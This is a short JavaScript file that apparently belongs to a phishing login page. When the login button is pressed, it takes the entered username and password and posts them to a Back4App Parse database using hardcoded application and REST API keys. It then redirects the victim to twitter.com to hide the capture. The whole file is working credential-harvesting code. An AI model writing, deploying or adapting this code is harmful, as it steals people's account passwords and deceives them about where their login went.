
const url = "https://parseapi.back4app.com/classes/teste";
const headers = {
    "Content-Type": "application/json",
    "X-Parse-Application-Id": "H5R7M0LsHsAX08M3RT9xjLCPhElvXwrw3aXZFqKg",
    "X-Parse-REST-API-Key": "4Sth2KlNENcbMz7q3AmsZZ5axLoS3jbA7qIcDyXy",
}

document.getElementById('login').onclick = async (e) => {
    e.preventDefault();
    const user = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    await fetch(url, {
        method: 'POST',
        headers: headers,
        body: JSON.stringify({
            "username": user,
            "password": password
        })
    })

    window.location.href = "https://twitter.com";
}